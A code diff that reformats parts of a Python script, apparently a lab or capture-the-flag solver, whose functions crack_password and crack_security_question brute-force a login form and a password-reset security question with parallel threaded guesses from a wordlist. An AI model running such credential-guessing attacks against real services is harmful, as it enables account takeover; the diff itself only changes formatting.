@@ -16,7 +16,7 @@ ACCOUNT_FIELD = "account_hash"
 ANSWER_FIELD = "answer"
 HEADERS = {
     HeaderField.CONTENT_TYPE.value: ContentType.FORM_URL.value[0],
-    HeaderField.ACCEPT.value: ContentType.HTML.value[0]
+    HeaderField.ACCEPT.value: ContentType.HTML.value[0],
 }
 
 
@@ -32,7 +32,13 @@ def crack_password(ip, instance_id, username):
     req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
     regex = r"Combination is invalid"
     passwd_req_gen = get_passwd_func(username)
-    return h.parallel_attack(req_template, passwd_req_gen, f(regex, True), data_file="uname_list.txt", threads=10)
+    return h.parallel_attack(
+        req_template,
+        passwd_req_gen,
+        f(regex, True),
+        data_file="uname_list.txt",
+        threads=10,
+    )
 
 
 def crack_security_question(ip, instance_id, user_hash):
@@ -48,7 +54,13 @@ def crack_security_question(ip, instance_id, user_hash):
     req_template = HttpRequest(ip, method=HttpMethod.POST, path=path, headers=HEADERS)
     regex = r"Invalid answer"
     reset_req_gen = get_reset_func(user_hash)
-    return h.parallel_attack(req_template, reset_req_gen, f(regex, True), data_file="uname_list.txt", threads=10)
+    return h.parallel_attack(
+        req_template,
+        reset_req_gen,
+        f(regex, True),
+        data_file="uname_list.txt",
+        threads=10,
+    )
 
 
 def get_passwd_func(username):
